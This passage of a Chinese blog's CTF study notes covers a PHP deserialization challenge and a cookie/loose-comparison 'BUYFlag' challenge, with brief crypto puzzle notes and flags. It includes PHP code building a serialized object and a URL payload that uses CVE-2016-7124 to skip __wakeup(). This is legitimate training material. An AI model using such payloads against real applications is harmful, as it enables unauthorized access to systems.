+<p>查看三个PHP文件.</p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_02.jpg" alt="02"></p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//1_16_03.jpg" alt="03"></p>
+<p>跟据代码，思路大致为</p>
+<blockquote>
+<p>利用get方法传参select，select要序列化。</p>
+<p>select的内容是建立一个对象Name，username&#x3D;admin，password&#x3D;100.</p>
+<p>要绕过wakeup() . &#x2F;&#x2F;<em>调用unserialize()时会自动调用魔法函数wakeup()</em></p>
+</blockquote>
+<p>构造语法(<a target="_blank" rel="noopener" href="https://www.bejson.com/runcode/php/">PHP执行</a>)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;yesyesyes&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-comment">//输出序列化</span><br><span class="hljs-comment">// O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>URL不能识别<code>&quot;</code>，同时，<code>&quot;Nameusername&quot;</code>应为<code>&quot;%00Name%00username&quot;</code></p>
+<blockquote>
+<p>因为成员（属性）是private，所以要在类名和成员名前加<code>%00</code>这个url编码是空的意思</p>
+<p>序列化时生成的序列化字符串中类名前后本来就会有0×00也就是空</p>
+</blockquote>
+<p>再利用CVE-2016-7124反序列化漏洞，属性数大于属性个数时，会跳过__wakeup()魔术函数。</p>
+<p>最终payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">/?select=<br>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D<br></code></pre></td></tr></table></figure>
+
+
+
+<p>解释一下这里利用了<code>echo urlencode($b)</code>直接将其URLencode，再将属性数改大。</p>
+<h3 id="17-BUYFlag"><a href="#17-BUYFlag" class="headerlink" title="17.BUYFlag"></a>17.BUYFlag</h3><p>查看pay.php的源码</p>
+<p>发现是post，抓包构造payload。</p>
+<p>修改cookie，user&#x3D;1(猜测)</p>
+<p>money&#x3D;1000000000&amp;password&#x3D;404a(PHP的弱等于)</p>
+<p>回显数字太长，用科学计数法1e9.</p>
+<p>得到flag</p>
+<h2 id="二、CRYPTO"><a href="#二、CRYPTO" class="headerlink" title="二、CRYPTO"></a>二、CRYPTO</h2><p>摩丝密码的英文只有大写</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">摩斯电码只有大写，将它改成大写就行啦<br></code></pre></td></tr></table></figure>
+
+<p>1.URL</p>
+<p>2.base-16，base-32，base-64</p>
+<p>3.md5</p>
+<p>4.ROT13旋转加密</p>
+<h3 id="1-PASSWORD"><a href="#1-PASSWORD" class="headerlink" title="1.PASSWORD"></a>1.PASSWORD</h3><p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930164451487.png" alt="image-20220930164451487"></p>
+<p>就是猜。。。</p>
+<p>flag{zs19900315}</p>
+<blockquote>
+<p>私钥d攻击</p>
+<p>Coppersmith相关攻击</p>
+<p>ECC</p>
+</blockquote>
+<h3 id="2-变异凯撒"><a href="#2-变异凯撒" class="headerlink" title="2.变异凯撒"></a>2.变异凯撒</h3><p>flag{Caesar_variation}</p>
+<p><em>凯撒加密，即将原私钥通过ASCII移位的方式加密。</em></p>
+<p>得到密文。可能每处移位的不一样。</p>
+<p>这里是<img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930170155624.png" alt="image-20220930170155624"></p>
+<p><strong>afZ_r9VYfScOeO_UL^RWUc</strong></p>
+<p>根据格式，对前5位，按照ASCII表解密为**flag{**，从而推出加密规律。</p>
+<p>udf提权，mof提权</p>
+<p>宽字节注入限制</p>
+<p>什么时候用，</p>
+<p>怎么用，用在哪，</p>
+<p>为什么要用。</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/10/20/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">SQL注入</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/10/20/Mathematics/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6(%E4%B8%8B)/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">高等数学(下)</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://s.gravatar.com/avatar/96dafc6fdd11543b0428bc470781d164?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Suivez">
+    
+    
+      <h2>Suivez</h2>
+    
+    
+      <p>Tech otakus save the world!</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>16</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        7
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        5
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+
+    <p id="notice">https://v1.hitokoto.cn/?c=b&amp;encode=text</p>
+  </div>
+</section>
+
+
+      <section class="widget-categories widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+      <span>CATEGORIES</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categories-list">
+      
+        <li class="categories-list-item">
+          <a href="/categories/Mathematics/">
+            Mathematics (5)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E6%9C%AD%E8%AE%B0/">
+            札记 (2)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/">
+            计算机科学 (6)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全 (2)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/">
+            程序设计笔记 (6)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/">
+            CTF (2)
+          </a>
+        </li>
+        
+        <li class="categories-list-item">
+          <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/DFS/">
+            DFS (3)
+          </a>
+        </li>
+        
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/C/" style="font-size: 17.5px;" class="tags-cloud-8">C++</a> <a href="/tags/CTF/" style="font-size: 12.5px;" class="tags-cloud-3">CTF</a> <a href="/tags/DFS/" style="font-size: 15px;" class="tags-cloud-5">DFS</a> <a href="/tags/Notes/" style="font-size: 20px;" class="tags-cloud-10">Notes</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;" class="tags-cloud-0">随笔</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/EveLappland/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">Suivez</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  
+
+
+
+
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
